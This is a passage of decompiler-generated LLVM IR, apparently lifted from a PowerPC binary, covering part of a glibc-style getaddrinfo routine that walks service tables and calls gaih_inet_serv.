  store i32 %v1_1001c8e0, i32* @r21, align 4
  br label %dec_label_pc_1001c8e4

dec_label_pc_1001c8e4:                            ; preds = %dec_label_pc_1001c8d0, %dec_label_pc_1001c8dc
  store i32 %v2_1001c8a4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 268552436, i32* @lr, align 4
  %v0_1001c8f0 = call i32 @__GI_memset()
  %v0_1001c8f4 = load i32, i32* @r27, align 4
  %v1_1001c8f4 = add i32 %v0_1001c8f4, 12
  %v2_1001c8f4 = inttoptr i32 %v1_1001c8f4 to i32*
  %v3_1001c8f4 = load i32, i32* %v2_1001c8f4, align 4
  store i32 %v3_1001c8f4, i32* %r11.global-to-local, align 4
  %v3_1001c8f8 = icmp eq i32 %v3_1001c8f4, 0
  %v1_1001c90c = add i32 %v0_1001c8f4, 8
  %v2_1001c90c = inttoptr i32 %v1_1001c90c to i32*
  br i1 %v3_1001c8f8, label %dec_label_pc_1001c90c, label %dec_label_pc_1001c900

dec_label_pc_1001c900:                            ; preds = %dec_label_pc_1001c8e4, %dec_label_pc_1001c90c
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001c920

dec_label_pc_1001c90c:                            ; preds = %dec_label_pc_1001c8e4
  %v3_1001c90c = load i32, i32* %v2_1001c90c, align 4
  store i32 %v3_1001c90c, i32* %r0.global-to-local, align 4
  %v3_1001c910 = icmp eq i32 %v3_1001c90c, 0
  br i1 %v3_1001c910, label %dec_label_pc_1001c988, label %dec_label_pc_1001c900

dec_label_pc_1001c91c:                            ; preds = %dec_label_pc_1001c95c, %dec_label_pc_1001c93c
  %v1_1001c91c = add i32 %v0_1001c91c, 7
  br label %dec_label_pc_1001c920

dec_label_pc_1001c920:                            ; preds = %dec_label_pc_1001c900, %dec_label_pc_1001c91c
  %v0_1001c91c = phi i32 [ ptrtoint (i8** @global_var_1002f03b.1188 to i32), %dec_label_pc_1001c900 ], [ %v1_1001c91c, %dec_label_pc_1001c91c ]
  store i32 %v0_1001c91c, i32* @r4, align 4
  %v1_1001c920 = add i32 %v0_1001c91c, 3
  %v2_1001c920 = inttoptr i32 %v1_1001c920 to i8*
  %v3_1001c920 = load i8, i8* %v2_1001c920, align 1
  %v4_1001c920 = zext i8 %v3_1001c920 to i32
  store i32 %v4_1001c920, i32* @r10, align 4
  %v3_1001c928 = icmp eq i8 %v3_1001c920, 0
  %v3_1001c974 = load i32, i32* %v2_1001c90c, align 4
  br i1 %v3_1001c928, label %dec_label_pc_1001c974, label %dec_label_pc_1001c930

dec_label_pc_1001c930:                            ; preds = %dec_label_pc_1001c920
  store i32 %v3_1001c974, i32* %r9.global-to-local, align 4
  %v3_1001c934 = icmp eq i32 %v3_1001c974, 0
  br i1 %v3_1001c934, label %dec_label_pc_1001c94c, label %dec_label_pc_1001c93c

dec_label_pc_1001c93c:                            ; preds = %dec_label_pc_1001c930
  %v1_1001c93c = inttoptr i32 %v0_1001c91c to i8*
  %v2_1001c93c = load i8, i8* %v1_1001c93c, align 1
  %v2_1001c940 = sext i8 %v2_1001c93c to i32
  store i32 %v2_1001c940, i32* %r0.global-to-local, align 4
  %v4_1001c944 = icmp eq i32 %v3_1001c974, %v2_1001c940
  br i1 %v4_1001c944, label %dec_label_pc_1001c94c, label %dec_label_pc_1001c91c

dec_label_pc_1001c94c:                            ; preds = %dec_label_pc_1001c93c, %dec_label_pc_1001c930
  br i1 %v3_1001c8f8, label %dec_label_pc_1001c96c.thread, label %dec_label_pc_1001c950

dec_label_pc_1001c950:                            ; preds = %dec_label_pc_1001c94c
  %v1_1001c950 = add i32 %v0_1001c91c, 2
  %v2_1001c950 = inttoptr i32 %v1_1001c950 to i8*
  %v3_1001c950 = load i8, i8* %v2_1001c950, align 1
  %v4_1001c950 = zext i8 %v3_1001c950 to i32
  store i32 %v4_1001c950, i32* %r0.global-to-local, align 4
  %v1_1001c954 = and i32 %v4_1001c950, 2
  store i32 %v1_1001c954, i32* %r9.global-to-local, align 4
  %v3_1001c954 = icmp eq i32 %v1_1001c954, 0
  br i1 %v3_1001c954, label %dec_label_pc_1001c95c, label %dec_label_pc_1001c96c.thread

dec_label_pc_1001c95c:                            ; preds = %dec_label_pc_1001c950
  %v1_1001c95c = add i32 %v0_1001c91c, 1
  %v2_1001c95c = inttoptr i32 %v1_1001c95c to i8*
  %v3_1001c95c = load i8, i8* %v2_1001c95c, align 1
  %v2_1001c960 = sext i8 %v3_1001c95c to i32
  store i32 %v2_1001c960, i32* %r0.global-to-local, align 4
  %v4_1001c964 = icmp eq i32 %v3_1001c8f4, %v2_1001c960
  br i1 %v4_1001c964, label %dec_label_pc_1001c96c.thread, label %dec_label_pc_1001c91c

dec_label_pc_1001c96c.thread:                     ; preds = %dec_label_pc_1001c95c, %dec_label_pc_1001c950, %dec_label_pc_1001c94c
  br label %dec_label_pc_1001c990

dec_label_pc_1001c974:                            ; preds = %dec_label_pc_1001c920
  store i32 %v3_1001c974, i32* %r0.global-to-local, align 4
  store i32 263, i32* %r9.global-to-local, align 4
  %v3_1001c97c = icmp eq i32 %v3_1001c974, 0
  br i1 %v3_1001c97c, label %dec_label_pc_1001d3bc, label %dec_label_pc_1001d3f8

dec_label_pc_1001c988:                            ; preds = %dec_label_pc_1001c90c
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002f034.1189 to i32), i32* @r4, align 4
  br label %dec_label_pc_1001c990

dec_label_pc_1001c990:                            ; preds = %dec_label_pc_1001c96c.thread, %dec_label_pc_1001c988
  %v0_1001cb68 = phi i32 [ ptrtoint (i32* @global_var_1002f034.1189 to i32), %dec_label_pc_1001c988 ], [ %v0_1001c91c, %dec_label_pc_1001c96c.thread ]
  %v0_1001c990 = load i32, i32* @r28, align 4
  %v3_1001c990 = icmp eq i32 %v0_1001c990, 0
  br i1 %v3_1001c990, label %dec_label_pc_1001caf8, label %dec_label_pc_1001c998

dec_label_pc_1001c998:                            ; preds = %dec_label_pc_1001c990
  %v1_1001c998 = add i32 %v0_1001cb68, 2
  %v2_1001c998 = inttoptr i32 %v1_1001c998 to i8*
  %v3_1001c998 = load i8, i8* %v2_1001c998, align 1
  %v4_1001c998 = zext i8 %v3_1001c998 to i32
  store i32 %v4_1001c998, i32* %r0.global-to-local, align 4
  %tmp112 = urem i8 %v3_1001c998, 2
  %v1_1001c99c = zext i8 %tmp112 to i32
  store i32 %v1_1001c99c, i32* @r10, align 4
  %v3_1001c99c = icmp eq i8 %tmp112, 0
  br i1 %v3_1001c99c, label %dec_label_pc_1001c9a4, label %dec_label_pc_1001d3bc

dec_label_pc_1001c9a4:                            ; preds = %dec_label_pc_1001c998
  %v1_1001c9a4 = add i32 %v0_1001c990, 4
  %v2_1001c9a4 = inttoptr i32 %v1_1001c9a4 to i32*
  %v3_1001c9a4 = load i32, i32* %v2_1001c9a4, align 4
  store i32 %v3_1001c9a4, i32* %r0.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v3_1001c9a4, -1
  br i1 %tmp80, label %dec_label_pc_1001caa4, label %dec_label_pc_1001c9b0

dec_label_pc_1001c9b0:                            ; preds = %dec_label_pc_1001c9a4
  %v1_1001c9b0 = add i32 %v0_1001cb68, 3
  %v2_1001c9b0 = inttoptr i32 %v1_1001c9b0 to i8*
  %v3_1001c9b0 = load i8, i8* %v2_1001c9b0, align 1
  %v4_1001c9b0 = zext i8 %v3_1001c9b0 to i32
  store i32 %v4_1001c9b0, i32* %r0.global-to-local, align 4
  %v1_1001c9b4 = add i32 %v0_1001cb68, 7
  store i32 %v1_1001c9b4, i32* @r30, align 4
  %v2_1001c9b8 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_1001c9b8, i32* %r26.global-to-local, align 4
  %v3_1001c9bc = icmp eq i8 %v3_1001c9b0, 0
  br i1 %v3_1001c9bc, label %dec_label_pc_1001ca84.preheader, label %dec_label_pc_1001c9c4

dec_label_pc_1001ca84.preheader:                  ; preds = %dec_label_pc_1001c9b0
  %v1_1001ca8423 = add i32 %v0_1001cb68, 10
  %v2_1001ca8424 = inttoptr i32 %v1_1001ca8423 to i8*
  %v3_1001ca8425 = load i8, i8* %v2_1001ca8424, align 1
  %v4_1001ca8426 = zext i8 %v3_1001ca8425 to i32
  store i32 %v4_1001ca8426, i32* %r0.global-to-local, align 4
  %v3_1001ca8828 = icmp eq i8 %v3_1001ca8425, 0
  br i1 %v3_1001ca8828, label %dec_label_pc_1001ca90, label %dec_label_pc_1001c9f4.lr.ph

dec_label_pc_1001c9f4.lr.ph:                      ; preds = %dec_label_pc_1001ca84.preheader
  %v2_1001ca54 = ptrtoint i32* %stack_var_-185 to i32
  br label %dec_label_pc_1001c9f4

dec_label_pc_1001c9c4:                            ; preds = %dec_label_pc_1001c9b0
  %v2_1001c9c4 = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1001c9c4, i32* %r0.global-to-local, align 4
  store i32 %v0_1001c8f4, i32* @r5, align 4
  store i32 %v2_1001c9c4, i32* %stack_var_-208, align 4
  %v2_1001c9d4 = ptrtoint i32* %stack_var_-185 to i32
  store i32 %v2_1001c9d4, i32* %r0.global-to-local, align 4
  %v1_1001c9d8 = call i32 @__asm_rlwinm(i32 %v2_1001c9d4, i32 0, i32 0, i32 27)
  store i32 %v1_1001c9d8, i32* %r0.global-to-local, align 4
  store i32 %v1_1001c9d8, i32* @r6, align 4
  store i32 %v1_1001c9d8, i32* %stack_var_-168, align 4
  store i32 268552680, i32* @lr, align 4
  %v1_1001c9e4 = call i32 @gaih_inet_serv(i32 %v1_1001c9d8)
  store i32 %v1_1001c9e4, i32* %r9.global-to-local, align 4
  %v3_1001c9e8 = icmp eq i32 %v1_1001c9e4, 0
  br i1 %v3_1001c9e8, label %dec_label_pc_1001cbc0, label %dec_label_pc_1001d3f8

dec_label_pc_1001c9f4:                            ; preds = %dec_label_pc_1001c9f4.lr.ph, %dec_label_pc_1001ca80
  %v0_1001ca44 = phi i32 [ %v1_1001c9b4, %dec_label_pc_1001c9f4.lr.ph ], [ %v1_1001ca80, %dec_label_pc_1001ca80 ]
  %v1_1001c9f4 = add i32 %v0_1001ca44, 2
  %v2_1001c9f4 = inttoptr i32 %v1_1001c9f4 to i8*
  %v3_1001c9f4 = load i8, i8* %v2_1001c9f4, align 1
  %v4_1001c9f4 = zext i8 %v3_1001c9f4 to i32
  store i32 %v4_1001c9f4, i32* %r11.global-to-local, align 4
  %tmp113 = urem i8 %v3_1001c9f4, 2
  %v1_1001c9f8 = zext i8 %tmp113 to i32
  store i32 %v1_1001c9f8, i32* %r0.global-to-local, align 4
  %v3_1001c9f8 = icmp eq i8 %tmp113, 0
  br i1 %v3_1001c9f8, label %dec_label_pc_1001ca00, label %dec_label_pc_1001ca80

dec_label_pc_1001ca00:                            ; preds = %dec_label_pc_1001c9f4
  %v0_1001ca00 = load i32, i32* @r27, align 4
  %v1_1001ca00 = add i32 %v0_1001ca00, 8
  %v2_1001ca00 = inttoptr i32 %v1_1001ca00 to i32*
  %v3_1001ca00 = load i32, i32* %v2_1001ca00, align 4
  store i32 %v3_1001ca00, i32* %r9.global-to-local, align 4
  %v3_1001ca04 = icmp eq i32 %v3_1001ca00, 0
  br i1 %v3_1001ca04, label %dec_label_pc_1001ca1c, label %dec_label_pc_1001ca0c

dec_label_pc_1001ca0c:                            ; preds = %dec_label_pc_1001ca00
  %v1_1001ca0c = inttoptr i32 %v0_1001ca44 to i8*
  %v2_1001ca0c = load i8, i8* %v1_1001ca0c, align 1
  %v2_1001ca10 = sext i8 %v2_1001ca0c to i32
  store i32 %v2_1001ca10, i32* %r0.global-to-local, align 4
  %v4_1001ca14 = icmp eq i32 %v3_1001ca00, %v2_1001ca10
  br i1 %v4_1001ca14, label %dec_label_pc_1001ca1c, label %dec_label_pc_1001ca80

dec_label_pc_1001ca1c:                            ; preds = %dec_label_pc_1001ca0c, %dec_label_pc_1001ca00
  %v1_1001ca1c = add i32 %v0_1001ca00, 12
  %v2_1001ca1c = inttoptr i32 %v1_1001ca1c to i32*
  %v3_1001ca1c = load i32, i32* %v2_1001ca1c, align 4
  store i32 %v3_1001ca1c, i32* %r9.global-to-local, align 4
  %v3_1001ca20 = icmp eq i32 %v3_1001ca1c, 0
  br i1 %v3_1001ca20, label %dec_label_pc_1001ca40, label %dec_label_pc_1001ca28

dec_label_pc_1001ca28:                            ; preds = %dec_label_pc_1001ca1c
  %v1_1001ca28 = and i32 %v4_1001c9f4, 2
  store i32 %v1_1001ca28, i32* %r0.global-to-local, align 4
  %v3_1001ca28 = icmp eq i32 %v1_1001ca28, 0
  br i1 %v3_1001ca28, label %dec_label_pc_1001ca30, label %dec_label_pc_1001ca40

dec_label_pc_1001ca30:                            ; preds = %dec_label_pc_1001ca28
  %v1_1001ca30 = add i32 %v0_1001ca44, 1
  %v2_1001ca30 = inttoptr i32 %v1_1001ca30 to i8*
  %v3_1001ca30 = load i8, i8* %v2_1001ca30, align 1
  %v2_1001ca34 = sext i8 %v3_1001ca30 to i32
  store i32 %v2_1001ca34, i32* %r0.global-to-local, align 4
  %v4_1001ca38 = icmp eq i32 %v3_1001ca1c, %v2_1001ca34
  br i1 %v4_1001ca38, label %dec_label_pc_1001ca40, label %dec_label_pc_1001ca80

dec_label_pc_1001ca40:                            ; preds = %dec_label_pc_1001ca30, %dec_label_pc_1001ca28, %dec_label_pc_1001ca1c
  %v2_1001ca40 = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1001ca40, i32* %r0.global-to-local, align 4
  store i32 %v0_1001ca44, i32* @r4, align 4
  store i32 %v0_1001ca00, i32* @r5, align 4
  store i32 %v2_1001ca40, i32* %stack_var_-208, align 4
  store i32 %v2_1001ca54, i32* %r0.global-to-local, align 4
  %v1_1001ca58 = call i32 @__asm_rlwinm(i32 %v2_1001ca54, i32 0, i32 0, i32 27)
  store i32 %v1_1001ca58, i32* %r29.global-to-local, align 4
  store i32 %v1_1001ca58, i32* @r6, align 4
  store i32 268552804, i32* @lr, align 4
  %v1_1001ca60 = call i32 @gaih_inet_serv(i32 %v1_1001ca58)
  store i32 %v1_1001ca60, i32* %r9.global-to-local, align 4
  %v3_1001ca64 = icmp eq i32 %v1_1001ca60, 0
  br i1 %v3_1001ca64, label %dec_label_pc_1001ca78, label %dec_label_pc_1001ca6c

dec_label_pc_1001ca6c:                            ; preds = %dec_label_pc_1001ca40
  %v1_1001ca6c = and i32 %v1_1001ca60, 256
  store i32 %v1_1001ca6c, i32* %r0.global-to-local, align 4
  %v3_1001ca6c = icmp eq i32 %v1_1001ca6c, 0
  br i1 %v3_1001ca6c, label %dec_label_pc_1001d3f8, label %dec_label_pc_1001ca80

dec_label_pc_1001ca78:                            ; preds = %dec_label_pc_1001ca40
  %v1_1001ca78 = load i32, i32* @r26, align 4
  %v2_1001ca78 = inttoptr i32 %v1_1001ca78 to i32*
  store i32 %v1_1001ca58, i32* %v2_1001ca78, align 4
  store i32 %v1_1001ca58, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1001ca80

dec_label_pc_1001ca80:                            ; preds = %dec_label_pc_1001ca6c, %dec_label_pc_1001ca30, %dec_label_pc_1001ca0c, %dec_label_pc_1001c9f4, %dec_label_pc_1001ca78
  %v0_1001ca80 = load i32, i32* @r30, align 4
  %v1_1001ca80 = add i32 %v0_1001ca80, 7
  store i32 %v1_1001ca80, i32* @r30, align 4
  %v1_1001ca84 = add i32 %v0_1001ca80, 10
  %v2_1001ca84 = inttoptr i32 %v1_1001ca84 to i8*
  %v3_1001ca84 = load i8, i8* %v2_1001ca84, align 1
  %v4_1001ca84 = zext i8 %v3_1001ca84 to i32
  store i32 %v4_1001ca84, i32* %r0.global-to-local, align 4
  %v3_1001ca88 = icmp eq i8 %v3_1001ca84, 0
  br i1 %v3_1001ca88, label %dec_label_pc_1001ca90, label %dec_label_pc_1001c9f4

dec_label_pc_1001ca90:                            ; preds = %dec_label_pc_1001ca80, %dec_label_pc_1001ca84.preheader
  %v3_1001ca90 = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001ca90, i32* %r0.global-to-local, align 4
  store i32 %v2_1001c8a4, i32* %r9.global-to-local, align 4
  %v4_1001ca98 = icmp eq i32 %v3_1001ca90, %v2_1001c8a4
  br i1 %v4_1001ca98, label %dec_label_pc_1001d3bc, label %dec_label_pc_1001cbc0

dec_label_pc_1001caa4:                            ; preds = %dec_label_pc_1001c9a4
  %v2_1001caa4 = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1001caa4, i32* %r0.global-to-local, align 4
  %v1_1001caa8 = inttoptr i32 %v0_1001cb68 to i8*
  %v2_1001caa8 = load i8, i8* %v1_1001caa8, align 1
  store i32 %v2_1001caa4, i32* %stack_var_-208, align 4
  %v2_1001cab0 = sext i8 %v2_1001caa8 to i32
  store i32 %v2_1001cab0, i32* %r11.global-to-local, align 4
  %v2_1001cab4 = ptrtoint i32* %stack_var_-185 to i32
  store i32 %v2_1001cab4, i32* %r9.global-to-local, align 4
  %v1_1001cab8 = call i32 @__asm_rlwinm(i32 %v2_1001cab4, i32 0, i32 0, i32 27)
  store i32 %v1_1001cab8, i32* %stack_var_-168, align 4
  %v0_1001cac0 = load i32, i32* @r10, align 4
  %v2_1001cac0 = inttoptr i32 %v1_1001cab8 to i32*
  store i32 %v0_1001cac0, i32* %v2_1001cac0, align 4
  %v3_1001cac4 = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001cac4, i32* %r9.global-to-local, align 4
  %v0_1001cac8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1001cac8 = add i32 %v3_1001cac4, 4
  %v3_1001cac8 = inttoptr i32 %v2_1001cac8 to i32*
  store i32 %v0_1001cac8, i32* %v3_1001cac8, align 4
  %v0_1001cacc = load i32, i32* @r4, align 4
  %v1_1001cacc = add i32 %v0_1001cacc, 2
  %v2_1001cacc = inttoptr i32 %v1_1001cacc to i8*
  %v3_1001cacc = load i8, i8* %v2_1001cacc, align 1
  %v4_1001cacc = zext i8 %v3_1001cacc to i32
  store i32 %v4_1001cacc, i32* %r0.global-to-local, align 4
  %v3_1001cad0 = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001cad0, i32* %r9.global-to-local, align 4
  %v1_1001cad4 = and i32 %v4_1001cacc, 2
  store i32 %v1_1001cad4, i32* %r11.global-to-local, align 4
  %v3_1001cad4 = icmp eq i32 %v1_1001cad4, 0
  br i1 %v3_1001cad4, label %dec_label_pc_1001cae4, label %dec_label_pc_1001cadc

dec_label_pc_1001cadc:                            ; preds = %dec_label_pc_1001caa4
  %v0_1001cadc = load i32, i32* @r27, align 4
  %v1_1001cadc = add i32 %v0_1001cadc, 12
  %v2_1001cadc = inttoptr i32 %v1_1001cadc to i32*
  %v3_1001cadc = load i32, i32* %v2_1001cadc, align 4
  br label %dec_label_pc_1001caec

dec_label_pc_1001cae4:                            ; preds = %dec_label_pc_1001caa4
  %v1_1001cae4 = add i32 %v0_1001cacc, 1
  %v2_1001cae4 = inttoptr i32 %v1_1001cae4 to i8*
  %v3_1001cae4 = load i8, i8* %v2_1001cae4, align 1
  %v4_1001cae4 = zext i8 %v3_1001cae4 to i32
  store i32 %v4_1001cae4, i32* %r0.global-to-local, align 4
  %v2_1001cae8 = sext i8 %v3_1001cae4 to i32
  br label %dec_label_pc_1001caec

dec_label_pc_1001caec:                            ; preds = %dec_label_pc_1001cadc, %dec_label_pc_1001cae4
  %storemerge4 = phi i32 [ %v3_1001cadc, %dec_label_pc_1001cadc ], [ %v2_1001cae8, %dec_label_pc_1001cae4 ]
  store i32 %storemerge4, i32* %r0.global-to-local, align 4
  %v2_1001caec = add i32 %v3_1001cad0, 8
  %v3_1001caec = inttoptr i32 %v2_1001caec to i32*
  store i32 %storemerge4, i32* %v3_1001caec, align 4
  %v0_1001caf0 = load i32, i32* @r28, align 4
  %v1_1001caf0 = add i32 %v0_1001caf0, 4
  %v2_1001caf0 = inttoptr i32 %v1_1001caf0 to i32*
  %v3_1001caf0 = load i32, i32* %v2_1001caf0, align 4
  br label %dec_label_pc_1001cb5c

dec_label_pc_1001caf8:                            ; preds = %dec_label_pc_1001c990
  %v1_1001caf8 = add i32 %v0_1001c8f4, 8
  %v2_1001caf8 = inttoptr i32 %v1_1001caf8 to i32*
  %v3_1001caf8 = load i32, i32* %v2_1001caf8, align 4
  store i32 %v3_1001caf8, i32* %r0.global-to-local, align 4
  %v3_1001cafc = icmp eq i32 %v3_1001caf8, 0
  br i1 %v3_1001cafc, label %dec_label_pc_1001cb04, label %dec_label_pc_1001cb0c

dec_label_pc_1001cb04:                            ; preds = %dec_label_pc_1001caf8
  br i1 %v3_1001c8f8, label %dec_label_pc_1001cb68, label %dec_label_pc_1001cb0c

dec_label_pc_1001cb0c:                            ; preds = %dec_label_pc_1001caf8, %dec_label_pc_1001cb04
  %v2_1001cb0c = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1001cb0c, i32* %r0.global-to-local, align 4
  %v1_1001cb10 = inttoptr i32 %v0_1001cb68 to i8*
  %v2_1001cb10 = load i8, i8* %v1_1001cb10, align 1
  store i32 %v2_1001cb0c, i32* %stack_var_-208, align 4
  %v2_1001cb18 = sext i8 %v2_1001cb10 to i32
  store i32 %v2_1001cb18, i32* %r11.global-to-local, align 4
  %v2_1001cb1c = ptrtoint i32* %stack_var_-185 to i32
  store i32 %v2_1001cb1c, i32* %r9.global-to-local, align 4
  %v1_1001cb20 = call i32 @__asm_rlwinm(i32 %v2_1001cb1c, i32 0, i32 0, i32 27)
  store i32 %v1_1001cb20, i32* %stack_var_-168, align 4
  %v0_1001cb28 = load i32, i32* @r28, align 4
  %v2_1001cb28 = inttoptr i32 %v1_1001cb20 to i32*
  store i32 %v0_1001cb28, i32* %v2_1001cb28, align 4
  %v3_1001cb2c = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001cb2c, i32* %r9.global-to-local, align 4
  %v0_1001cb30 = load i32, i32* %r11.global-to-local, align 4
  %v2_1001cb30 = add i32 %v3_1001cb2c, 4
  %v3_1001cb30 = inttoptr i32 %v2_1001cb30 to i32*
  store i32 %v0_1001cb30, i32* %v3_1001cb30, align 4
  %v0_1001cb34 = load i32, i32* @r4, align 4
  %v1_1001cb34 = add i32 %v0_1001cb34, 2
  %v2_1001cb34 = inttoptr i32 %v1_1001cb34 to i8*
  %v3_1001cb34 = load i8, i8* %v2_1001cb34, align 1
  %v4_1001cb34 = zext i8 %v3_1001cb34 to i32
  store i32 %v4_1001cb34, i32* %r0.global-to-local, align 4
  %v3_1001cb38 = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001cb38, i32* %r9.global-to-local, align 4
  %v1_1001cb3c = and i32 %v4_1001cb34, 2
  store i32 %v1_1001cb3c, i32* %r11.global-to-local, align 4
  %v3_1001cb3c = icmp eq i32 %v1_1001cb3c, 0
  br i1 %v3_1001cb3c, label %dec_label_pc_1001cb4c, label %dec_label_pc_1001cb44

dec_label_pc_1001cb44:                            ; preds = %dec_label_pc_1001cb0c
  %v0_1001cb44 = load i32, i32* @r27, align 4
  %v1_1001cb44 = add i32 %v0_1001cb44, 12
  %v2_1001cb44 = inttoptr i32 %v1_1001cb44 to i32*
  %v3_1001cb44 = load i32, i32* %v2_1001cb44, align 4
  br label %dec_label_pc_1001cb54

dec_label_pc_1001cb4c:                            ; preds = %dec_label_pc_1001cb0c
  %v1_1001cb4c = add i32 %v0_1001cb34, 1
  %v2_1001cb4c = inttoptr i32 %v1_1001cb4c to i8*
  %v3_1001cb4c = load i8, i8* %v2_1001cb4c, align 1
  %v4_1001cb4c = zext i8 %v3_1001cb4c to i32
  store i32 %v4_1001cb4c, i32* %r0.global-to-local, align 4
  %v2_1001cb50 = sext i8 %v3_1001cb4c to i32
  br label %dec_label_pc_1001cb54

dec_label_pc_1001cb54:                            ; preds = %dec_label_pc_1001cb44, %dec_label_pc_1001cb4c
  %storemerge6 = phi i32 [ %v3_1001cb44, %dec_label_pc_1001cb44 ], [ %v2_1001cb50, %dec_label_pc_1001cb4c ]
  store i32 %storemerge6, i32* %r0.global-to-local, align 4
  %v2_1001cb54 = add i32 %v3_1001cb38, 8
  %v3_1001cb54 = inttoptr i32 %v2_1001cb54 to i32*
  store i32 %storemerge6, i32* %v3_1001cb54, align 4
  br label %dec_label_pc_1001cb5c

dec_label_pc_1001cb5c:                            ; preds = %dec_label_pc_1001caec, %dec_label_pc_1001cb54
  %storemerge5 = phi i32 [ %v3_1001caf0, %dec_label_pc_1001caec ], [ 0, %dec_label_pc_1001cb54 ]
  store i32 %storemerge5, i32* %r0.global-to-local, align 4
  %v3_1001cb5c = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001cb5c, i32* %r9.global-to-local, align 4
  %v2_1001cb60 = add i32 %v3_1001cb5c, 12
  %v3_1001cb60 = inttoptr i32 %v2_1001cb60 to i32*
  store i32 %storemerge5, i32* %v3_1001cb60, align 4
  br label %dec_label_pc_1001cbc0

dec_label_pc_1001cb68:                            ; preds = %dec_label_pc_1001cb04
  %v1_1001cb68 = add i32 %v0_1001cb68, 7
  store i32 %v1_1001cb68, i32* %r4.global-to-local, align 4
  %v2_1001cb6c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_1001cb6c, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  %v1_1001cbb416 = add i32 %v0_1001cb68, 10
  %v2_1001cbb417 = inttoptr i32 %v1_1001cbb416 to i8*
  %v3_1001cbb418 = load i8, i8* %v2_1001cbb417, align 1
  %v4_1001cbb419 = zext i8 %v3_1001cbb418 to i32
  store i32 %v4_1001cbb419, i32* %r0.global-to-local, align 4
  %v3_1001cbb821 = icmp eq i8 %v3_1001cbb418, 0
  br i1 %v3_1001cbb821, label %dec_label_pc_1001cbc0, label %dec_label_pc_1001cb78.lr.ph

dec_label_pc_1001cb78.lr.ph:                      ; preds = %dec_label_pc_1001cb68
  %v2_1001cb94 = ptrtoint i32* %stack_var_-185 to i32
  br label %dec_label_pc_1001cb78

dec_label_pc_1001cb78:                            ; preds = %dec_label_pc_1001cb78.lr.ph, %dec_label_pc_1001cb78
  %v0_1001cb84 = phi i32 [ %v1_1001cb68, %dec_label_pc_1001cb78.lr.ph ], [ %v0_1001cbb4, %dec_label_pc_1001cb78 ]
  %v2_1001cb78 = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1001cb78, i32* %r9.global-to-local, align 4
  %v1_1001cb7c = inttoptr i32 %v0_1001cb84 to i8*
  %v2_1001cb7c = load i8, i8* %v1_1001cb7c, align 1
  %v3_1001cb7c = zext i8 %v2_1001cb7c to i32
  store i32 %v3_1001cb7c, i32* %r0.global-to-local, align 4
  %v1_1001cb80 = add i32 %v0_1001cb84, 1
  %v2_1001cb80 = inttoptr i32 %v1_1001cb80 to i8*
  %v3_1001cb80 = load i8, i8* %v2_1001cb80, align 1
  %v1_1001cb84 = add i32 %v0_1001cb84, 7
  store i32 %v1_1001cb84, i32* %r4.global-to-local, align 4
  store i32 %v2_1001cb78, i32* %stack_var_-208, align 4
  %v2_1001cb8c = sext i8 %v2_1001cb7c to i32
  store i32 %v2_1001cb8c, i32* %r0.global-to-local, align 4
  %v2_1001cb90 = sext i8 %v3_1001cb80 to i32
  store i32 %v2_1001cb90, i32* %r11.global-to-local, align 4
  store i32 %v2_1001cb94, i32* %r9.global-to-local, align 4
  %v1_1001cb98 = call i32 @__asm_rlwinm(i32 %v2_1001cb94, i32 0, i32 0, i32 27)
  store i32 %v1_1001cb98, i32* %r9.global-to-local, align 4
  %v0_1001cb9c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001cb9c = add i32 %v1_1001cb98, 4
  %v3_1001cb9c = inttoptr i32 %v2_1001cb9c to i32*
  store i32 %v0_1001cb9c, i32* %v3_1001cb9c, align 4
  %v0_1001cba0 = load i32, i32* %r11.global-to-local, align 4
  %v2_1001cba0 = add i32 %v1_1001cb98, 8
  %v3_1001cba0 = inttoptr i32 %v2_1001cba0 to i32*
  store i32 %v0_1001cba0, i32* %v3_1001cba0, align 4
  %v0_1001cba4 = load i32, i32* @r10, align 4
  %v2_1001cba4 = inttoptr i32 %v1_1001cb98 to i32*
  store i32 %v0_1001cba4, i32* %v2_1001cba4, align 4
  %v0_1001cba8 = load i32, i32* @r10, align 4
  %v2_1001cba8 = add i32 %v1_1001cb98, 12
  %v3_1001cba8 = inttoptr i32 %v2_1001cba8 to i32*
  store i32 %v0_1001cba8, i32* %v3_1001cba8, align 4
  %v1_1001cbac = load i32, i32* @r8, align 4
  %v2_1001cbac = inttoptr i32 %v1_1001cbac to i32*
  store i32 %v1_1001cb98, i32* %v2_1001cbac, align 4
  store i32 %v1_1001cb98, i32* @r8, align 4
  %v0_1001cbb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001cbb4 = add i32 %v0_1001cbb4, 3
  %v2_1001cbb4 = inttoptr i32 %v1_1001cbb4 to i8*
  %v3_1001cbb4 = load i8, i8* %v2_1001cbb4, align 1
  %v4_1001cbb4 = zext i8 %v3_1001cbb4 to i32
  store i32 %v4_1001cbb4, i32* %r0.global-to-local, align 4
  %v3_1001cbb8 = icmp eq i8 %v3_1001cbb4, 0
  br i1 %v3_1001cbb8, label %dec_label_pc_1001cbc0, label %dec_label_pc_1001cb78

dec_label_pc_1001cbc0:                            ; preds = %dec_label_pc_1001cb78, %dec_label_pc_1001cb68, %dec_label_pc_1001ca90, %dec_label_pc_1001c9c4, %dec_label_pc_1001cb5c
  %v0_1001cbc0 = load i32, i32* @r24, align 4
